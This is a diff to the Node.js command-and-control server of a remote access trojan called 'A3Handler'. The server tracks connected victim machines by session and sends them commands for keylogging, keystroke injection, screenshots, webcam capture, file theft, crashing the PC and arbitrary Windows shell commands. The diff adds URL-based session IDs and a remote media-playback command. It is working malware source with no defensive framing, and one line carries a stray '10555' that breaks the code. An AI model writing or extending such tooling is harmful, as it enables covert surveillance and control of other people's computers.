@@ -15,7 +15,7 @@ var WebsocketErrorCodes = {
 };
 var workingDir = "";
 var lastWorkingDir = "";
-sessions = [];
+var sessions = [];
 var filename = "";
 const wss = new WebSocket.Server({
 	port: 4422,
@@ -33,17 +33,14 @@ var rl = readline.createInterface({
 currentSession = 0;
 console.log("\n");
 
-console.log("      ___                       ___           ___                       ___     ".rainbow);
-console.log("     /  /\\          ___        /  /\\         /  /\\        ___          /  /\\    ".rainbow);
-console.log("    /  /::\\        /  /\\      /  /::\\       /  /::\\      /  /\\        /  /:/_   ".rainbow);
-console.log("   /  /:/\\:\\      /  /:/     /  /:/\\:\\     /  /:/\\:\\    /  /:/       /  /:/ /\\ " .rainbow);
-console.log("  /  /:/~/::\\    /  /:/     /  /:/~/:/    /  /:/  \\:\\  /__/::\\      /  /:/ /::\\ ".rainbow);
-console.log(" /__/:/ /:/\\:\\  /  /::\\    /__/:/ /:/___ /__/:/ \\__\\:\\ \\__\\/\\:\\__  /__/:/ /:/\\:\\ ".rainbow);
-console.log(" \\  \\:\\/:/__\\/ /__/:/\\:\\   \\  \\:\\/:::::/ \\  \\:\\ /  /:/    \\  \\:\\/\\ \\  \\:\\/:/~/:/".rainbow);
-console.log("  \\  \\::/      \\__\\/  \\:\\   \\  \\::/~~~~   \\  \\:\\  /:/      \\__\\::/  \\  \\::/ /:/ ".rainbow);
-console.log("   \\  \\:\\           \\  \\:\\   \\  \\:\\        \\  \\:\\/:/       /__/:/    \\__\\/ /:/  ".rainbow);
-console.log("    \\  \\:\\           \\__\\/    \\  \\:\\        \\  \\::/        \\__\\/       /__/:/   ".rainbow);
-console.log("     \\__\\/                     \\__\\/         \\__\\/                     \\__\\/    ".rainbow);
+console.log(" ________  ________".rainbow);
+console.log("|\\   __  \\|\\_____  \\".rainbow);
+console.log("\\ \\  \\|\\  \\|____|\\ /_".rainbow);
+console.log(" \\ \\   __  \\    \\|\\  \\".rainbow);
+console.log("  \\ \\  \\ \\  \\  __\\_\\  \\".rainbow);
+console.log("   \\ \\__\\ \\__\\|\\_______\\".rainbow);
+console.log("    \\|__|\\|__|\\|_______|".rainbow);
+
 console.log("\n");
 console.log("CREATED BY ".trap.bold + "A".bold + ", devellopped by ".trap.bold + "A".bold + " and ".trap.bold + "H".bold);
 console.log("");
@@ -52,10 +49,13 @@ console.log("[".bold + "+".green + "] Waiting for connection to server !".bold);
 rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
 rl.prompt();
 
-wss.on('connection', function connection(ws) {
-	sessions.push(ws);
-	var lastSession = sessions.length - 1;
+wss.on('connection', function connection(ws, req) {
+	var newId =  getUrlParams(req.url).id;
+	sessions[newId] = ws;
+	var lastSession = newId;
 	sessions[lastSession].clientAddress = ws._socket.remoteAddress.replace("::ffff:", "");
+	sessions[lastSession].sessionId = lastSession;
+	sessions[lastSession].infos = getUrlParams(req.url).infos;
 	if(menu){
 		console.log("\n[".bold + "+".green + "] Connected to client : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + " !".bold);
 		menu = false;
@@ -65,8 +65,9 @@ wss.on('connection', function connection(ws) {
 	}else{
 		console.log("[".bold + "+".green + "] New client connected : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + ", client backgrounded as ID : ".bold + lastSession + " !".bold);
 	}
+
 	ws.on('message', function incoming(message) {
-		if(ws._socket.remoteAddress.replace("::ffff:", "") == sessions[currentSession].clientAddress){
+		if(getUrlParams(req.url).id == currentSession){
 			if (typeof message == "object") {
 				mkdirp('clients/' + sessions[currentSession].clientAddress + "/files", function(err) { 
 					var stream = require("fs").createWriteStream('clients/' + sessions[currentSession].clientAddress + "/files" + "/" + filename);
@@ -93,11 +94,9 @@ wss.on('connection', function connection(ws) {
 					console.log("[".bold + "-".red + "] ".bold + message.replace("##ERROR##","").bold);
 			}else if (message.startsWith("hello")) {
 				workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
-				if(lastWorkingDir == workingDir || lastWorkingDir == ""){
-					lastWorkingDir = workingDir;
-					rl.setPrompt(lastWorkingDir + "> ");
-					rl.prompt();
-				}
+				lastWorkingDir = workingDir;
+				rl.setPrompt(lastWorkingDir + "> ");
+				rl.prompt();
 			} else if (message.startsWith("##finish##")) {
 				ws.send("#pwd");
 			} else if (message.startsWith("##SCREENSHOT##")) {
@@ -135,8 +134,7 @@ wss.on('connection', function connection(ws) {
 			menu = true;
 		}
 
-		delete sessions[findSessionNumber(ws, sessions)];
-		sessions.length -= 1;
+		delete sessions[getUrlParams(req.url).id];
 		rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
 		rl.prompt();
 	});
@@ -152,15 +150,35 @@ function findSessionNumber(SS, SE){
 	}
 }
 
+function getUrlParams(search) {
+    let hashes = search.slice(search.indexOf('?') + 1).split('&')
+    let params = {}
+    hashes.map(hash => {
+        let [key, val] = hash.split('=')
+        params[key] = decodeURIComponent(val)
+    })
+
+    return params
+}
+
+function makeId() {
+  var text = "";
+  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+  for (var i = 0; i < 10; i++)
+    text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+  return text;
+}
+
 function suggestions(line) {
-	const completions = 'win_help exit help speedtest sessions background get_user_infos keylogger sendkey ppal set_state current list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
+	const completions = 'win_help exit help speedtest sessions play background get_user_infos keylogger sendkey ppal set_state current list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
 	const hits = completions.filter((c) => c.startsWith(line));
 	return [hits.length ? hits : completions, line];
 }
 
 rl.on('line', (line) => {
 	var msg = line.trim();
-	console.log("newLine");
 	if(!menu){
 		if (msg == "screenshot") {
 			console.log("[".bold + "+".blue + "] Uploading screenshot (May exceed 10MO, please be patient)...".bold);
@@ -168,6 +186,13 @@ rl.on('line', (line) => {
 		} else if (msg == "speedtest") {
 			console.log("[".bold + "+".blue + "] Speed testing...".bold);
 			sessions[currentSession].send(msg);
+		} else if (msg.startsWith("play")) {
+			if(msg.split(" ").length == 2){
+				console.log("[".bold + "+".blue + "] Request sent...".bold);
+				sessions[currentSession].send("start vlc --intf dummy " + msg.split(" ")[1].replaceAll("/","\\"));
+			}else{
+				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "play <path>");
+			}	
 		} else if (msg == "current") {
 			console.log("[".bold + "+".blue + "] Current session is : ".bold + currentSession);
 			rl.prompt();
@@ -177,7 +202,7 @@ rl.on('line', (line) => {
 			}else{
 				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "sendkeys <keys>");
 				console.log("[".white + "i".yellow + "]".white + " Examples : ".bold + "sendkeys {F4}");
-					console.log("              sendkeys {A}");
+					console.log("              sendkeys {A}");10555
 					console.log("              sendkeys ABC");
 					console.log("              sendkeys {F1}ABC{ENTER}");
 					console.log("              sendkeys ^{C}");
@@ -312,10 +337,12 @@ rl.on('line', (line) => {
 	}else{
 		if(msg.startsWith("sessions")){
 			if(msg.split(" ").length == 2 && msg.split(" ")[1] == "list"){
-				if(sessions.length > 0){
+				if(Object.keys(sessions).length > 0){
+					var c = 0;
+					console.log("LISTING SESSIONS : ");
 					for(s in sessions){
-						console.log("LISTING SESSIONS : ");
-						console.log("Session : ID : ".bold + s.bold.cyan + " IP : ".bold + sessions[s].clientAddress.bold.cyan);
+						console.log(c + " ID : ".bold + sessions[s].sessionId.bold.cyan + " IP : ".bold + sessions[s].clientAddress.bold.cyan + " V : ".bold + sessions[s].infos.bold.blue);
+						c++;
 					}
 				}else{
 					console.log("[".white + "-".red + "]".white + " No sessions !".red);
